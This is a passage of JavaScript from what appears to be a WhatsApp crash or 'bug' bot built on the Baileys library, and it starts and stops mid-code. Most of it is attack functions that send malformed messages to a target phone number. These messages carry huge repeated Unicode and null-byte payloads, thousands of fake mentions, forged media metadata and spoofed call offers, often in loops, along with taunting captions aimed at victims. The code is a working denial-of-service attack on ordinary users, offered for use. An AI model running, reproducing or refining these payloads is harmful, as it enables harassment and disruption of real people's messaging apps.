825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 5; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 4) {
    await new Promise(resolve => setTimeout(resolve, 4000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function fcinvisotax(target) {
const sender = [...sessions.keys()][0];
  if (!sender || !sessions.has(sender)) return { success: false, error: "no-sender" };
  const sock = sessions.get(sender);
  if (!sock) return { success: false, error: "invalid-session" };
  let baileysLib = null;
  try { baileysLib = require('@otaxayun/baileys'); } catch (e1) { try { baileysLib = require('@adiwajshing/baileys'); } catch (e2) { baileysLib = null; } }

  const encodeWAMessageFn = baileysLib?.encodeWAMessage ?? sock.encodeWAMessage?.bind(sock) ?? ((msg) => {
    try { return Buffer.from(JSON.stringify(msg)); } catch (e) { return Buffer.from([]); }
  });

  const encodeSignedDeviceIdentityFn = baileysLib?.encodeSignedDeviceIdentity ?? sock.encodeSignedDeviceIdentity?.bind(sock) ?? null;

  try {
    const jid = String(target).includes("@s.whatsapp.net")
      ? String(target)
      : `${String(target).replace(/\D/g, "")}@s.whatsapp.net`;

    const janda = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    const javhd = janda();
    const jepang = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    const yntkts = encodeWAMessageFn;

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      const patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      const ywdh = Array.isArray(patched) ? patched : recipientJids.map(j => ({ recipientJid: j, message: patched }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
      const omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(ywdh.map(async ({ recipientJid: j, message: msg }) => {
        const { user: targetUser } = jidDecode(j);
        const { user: ownUser } = jidDecode(meId);
        const isOwn = targetUser === ownUser || targetUser === omak;
        const y = j === meId || j === meLid;
        if (dsmMessage && isOwn && !y) msg = dsmMessage;

        const bytes = jepang(yntkts ? yntkts(msg) : Buffer.from([]));
        return javhd.mutex(j, async () => {
          const { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid: j, data: bytes });
          if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
          return {
            tag: "to",
            attrs: { jid: j },
            content: [{ tag: "enc", attrs: { v: "2", type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let devices = [];
    try {
      devices = (await sock.getUSyncDevices([jid], false, false))
        .map(({ user, device }) => `${user}${device ? ":" + device : ""}@s.whatsapp.net`);
    } catch {
      devices = [jid];
    }

    try { await sock.assertSessions(devices); } catch {}

    let { nodes: destinations, shouldIncludeDeviceIdentity } = { nodes: [], shouldIncludeDeviceIdentity: false };
    try {
      const created = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: "0" });
      destinations = created?.nodes ?? [];
      shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
    } catch { destinations = []; shouldIncludeDeviceIdentity = false; }

    const otaxkiw = {
      tag: "call",
      attrs: { to: jid, id: sock.generateMessageTag ? sock.generateMessageTag() : crypto.randomBytes(8).toString("hex"), from: sock.user?.id || sock.authState?.creds?.me?.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user?.id || sock.authState?.creds?.me?.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations }
        ]
      }]
    };

    if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentityFn) {
      try {
        const deviceIdentity = encodeSignedDeviceIdentityFn(sock.authState.creds.account, true);
        otaxkiw.content[0].content.push({ tag: "device-identity", attrs: {}, content: deviceIdentity });
      } catch (e) {}
    }

    await sock.sendNode(otaxkiw);

    return { success: true, target: jid, method: "sendNode" };
  } catch (err) {
    return { success: false, error: err?.message ?? String(err) };
  }
}

async function SarzzExperiment(sock, target) {
  const SarzzMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Sarzz Kill You Wkwk",
      contextInfo: {
        remoteJid: "X",
           participant: target,
           stanzaId: "1234567890ABCDEF",
            quotedMessage: {
            paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, SarzzMsg.message, { messageId: SarzzMsg.key.id });
   await sock.sendMessage(target, { delete: SarzzMsg.key });
}

async function YTXsaranax(sock, target) {
  let sepongkontolyutax = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ꦾ".repeat(70000),
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: "2892ꦾ8181@s.whatsapp.net"
            },
            interactiveMessage: {
              body: {
                text: "MakluWEntot" + "ꦾ".repeat(25000),
              },
            locationMessage: {
              degressLatitude: -5,
              degressLongitude: 5,
            },
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            stanzaId: "forward-Id" + Math.floor(Math.random() * 99999),
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(30000)
            },
            mentions: Array.from({ length: 2000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "MakluDesahEnak" + "ꦾ".repeat(35000),
                    },
                    nativeFlowResponseMessage: {
                      name: "address_message",
                      paramsJson: "ꦾ".repeat(30000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
};

 await sock.relayMessage("status@broadcast", sepongkontolyutax.message, {
        messageId: sepongkontolyutax.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    
    let maklusemokdientotyutax = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            remoteJid: target,
            fromMe: true,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`),
            groupMentions: [
              {
                groupJid: "628xxxxxx2345@g.us",
                groupSubject: "ꦾ".repeat(30000)
              }
            ],
            forwardingScore: 999
          }
        }
      }
    }
  };
  
  await sock.relayMessage("status@broadcast", maklusemokdientotyutax.message, {
        messageId: maklusemokdientotyutax.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    console.log(`Succes Sending YTX-SARANAX To ${target}`);
}

async function Novainfinite(target, ptcp = false) {
    const msg = {
        interactiveMessage: {
            title: '̶S̶a̶n̶z̶y 𝘐𝘴 𝘉𝘢𝘤𝘬 𝘉𝘳𝘶𝘸𝘩𝘩' + "ꦾ".repeat(50000),
            nativeFlowMessage: {
                buttons: [
                    {
                        name: 'review_and_pay',
                        buttonParamsJson: "{\"currency\":\"XOF\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":999999999,\"offset\":100},\"reference_id\":\"ZERO TRASHED\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"descripiton\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-69d62566-4850-469a-b192-a6fd9f58cc14\",\"name\":null,\"amount\":{\"value\":999999999,\"offset\":100},\"quantity\":1}]},\"additional_note\":null,\"native_payment_methods\":[],\"share_payment_status\":false}"
                    }
                ]
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: true,
                isForwarded: true,
                forwardingScore: 9999,
                quotedMessage: {
                    interactiveResponseMessage: {
                        body: {
                            text: "©️ Sanzyy Is Back",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: "\u0000".repeat(500000),
                            version: 3
                        }
                    }
                }
            }
        }
    };
    
    await sock.sendMessage(target, msg, 
        ptcp ? { participant: { jid: target } } : {});
}

async function apollox(number, tagEwe = false) {
  let biji = await generateWAMessageFromContent(
    number,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "You Idiot's",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  let message = generateWAMessageFromContent(
    number,
    {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, z) => `1313555000${z + 1}@s.whatsapp.net`
            ),
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  }, {});

  let etc = generateWAMessageFromContent(
    number,
    {
      interactiveResponseMessage: {
        body: {
          text: "xrl - null",
          format: "EXTENTION_1",
        },
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, z) => `1313555020${z + 1}@s.whatsapp.net`
          ),
          statusAttributionType: "SHARED_FROM_MENTION",
        },
        nativeFlowResponseMessage: {
          name: "menu_options",
          paramsJson:
            '{"display_text":"xrl","id":".fucker","description":"Finnaly my?..."}',
          version: "3",
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );

  const genos = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
      fileLength: "327833",
      seconds: 15,
      mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
      caption: "Xrelly Mp5" + "\u0000".repeat(9000),
      height: 1248,
      width: 704,
      fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
      directPath:
        "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&nc_sid=5e03e0",
      mediaKeyTimestamp: "1748347294",
      contextInfo: {
        isSampled: true,
        mentionedJid: Array.from(
          { length: 2000 },
          (_, z) => `1313555020${z + 1}@s.whatsapp.net`
        ),
        statusAttributionType: "SHARED_FROM_MENTION",
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "Xrelly Mp5",
      },
      streamingSidecar:
        "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
      thumbnailDirectPath:
        "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
      thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
      thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
      annotations: [
        {
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "589608164114571",
              songId: "870166291800508",
              author: "ARE YOU KIDDING ME?!!!",
              title: "\u0000".repeat(90000),
              artworkDirectPath:
                "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
              artistAttribution: "https://www.instagram.com/_u/xrelly",
              countryBlocklist: true,
              isExplicit: true,
              artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
            },
          },
          embeddedAction: true,
        },
      ],
    },
  };

  for (let i = 0; i < 100; i++) {
  await sock.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", biji.message, {
    messageId: biji.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  await sock.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [number],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: number }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (tagEwe) {
    let nichollx = generateWAMessageFromContent(
      number,
      proto.Message.fromObject({
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: letakx.key,
              type: "STATUS_MENTION_MESSAGE",
              timestamp: Date.now() + 720,
            },
          },
        },
      }),
      {}
    );

    await sock.relayMessage(number, nichollx.message, {
      participant: { jid: number },
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        },
      ],
    });
  }
}
  
    await new Promise(resolve => setTimeout(resolve, 5000));
}

async function vom2GlxGs(sock, target, pc = true) {
  for (let z = 0; z < 100; z++) {
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: " Ola, idiota sinkoza raldz impossible ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\": \"3\"}`,
              version: 3
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      pc
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
  }
}

async function Abimzubreg(target) {
  try {
    const datamsg1 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
              ]
            },
            body: {
              nativeFlowMessage: {
                messageParamsJson: "",
                messageVersion: 3,
                buttons: [
                  {
                    title: "I am Abim v1",
                    text: "I am Salsa v2",
                    format: "DEFAULT"
                  }
                ],
                nativeFlowMessage2: {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(3000)
                },
                interactiveMessage2: {
                  body: "Kiw🐉"
                },
                viewOnceMessage2: {
                  text: "..."
                },
                name: "Abim - Salsa ¿?" + "\u0000" + "𑇂𑆵𑆴𑆿".repeat(1000)
              }
            }
          }
        }
      }
    };

    const datamsg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            externalAdReply: {
              title: "ꦾ".repeat(12000),
              description: "𑇂𑆵𑆴𑆿".repeat(2000)
            },
            nativeFlowResponseMessage: {
              title: "[ ABIM ] - ISBACK" + "𑇂𑆵𑆴𑆿".repeat(5000),
              name: "cta_reply",
              buttonParamsJson: "{}"
            },
            extraButtons: [
              { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(1000) },
              { name: "address_message", buttonParamsJson: "\u0000".repeat(2000) }
            ],
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: " ",
              height: 999999,
              width: 999999,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                isSampled: true,
                mentionedJid: [
                  "13135550002@s.whatsapp.net",
                  ...Array.from({ length: 30000 }, () =>
                    `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                  )
                ],
                businessMessageForwardInfo: {
                  businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                mentionedJid2: [
                  target,
                  "1@s.whatsapp.net",
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1997 }, () =>
                    `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
                  )
                ]
              }
            }
          }
        }
      }
    };

    const datamsg3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            externalAdReply: {
              lottieStickerMessage: {
                title: "ꦾ".repeat(12000),
                description: "𑇂𑆵𑆴𑆿".repeat(3000)
              }
            },
            nativeFlowResponseMessage: {
              title: "[ INVIS ] - ISBACK" + "𑇂𑆵𑆴𑆿".repeat(5000),
              nativeFlowMessage2: {
                name: "call_permission_request",
                buttonParamsJson: "\u0000".repeat(3000)
              }
            },
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "image/webp",
              height: 9999,
              width: 9999,
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
              fileLength: 12260,
              mediaKeyTimestamp: "1743832131",
              isAnimated: false,
              stickerSentTs: "X",
              isAvatar: false,
              isAiSticker: false,
              isLottie: true,
              contextInfo: {
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from(
                    { length: 1900 },
                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                  ),
                ],
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: { text: "\UBBBB", format: "DEFAULT" }
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_msssage",
                    paramsJson: "\ubbbb".repeat(2000),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    };

    for (const msg of [datamsg1]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });
    }

    for (const msg of [datamsg2, datamsg3]) {
      await sock.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      });
    }

    console.log(`Wolker Your Devices 🧪 Sending To ${target} suksesfull`);
  } catch (e) {
    console.error(e);
  }
}

async function HxDZiaoXang(target) {
  const ElHxD = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            videoMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4",
              mimetype: "video/mp4",
              caption: "Ziao Xang adalah seorang ci i o😙🗿🌪️😙☠️❤️‍🩹😭👈⚡😜⚡",
              fileSha256: Buffer.from(
                "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                "base64"
              ),
              fileEncSha256: Buffer.from(
                "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                "base64"
              ),
              mediaKey: Buffer.from(
                "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                "base64"
              ),
              directPath:
                "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
              fileLength: 12260,
              seconds: 1,
              mediaKeyTimestamp: Math.floor(Date.now() / 1000),
            },
          },
          body: {
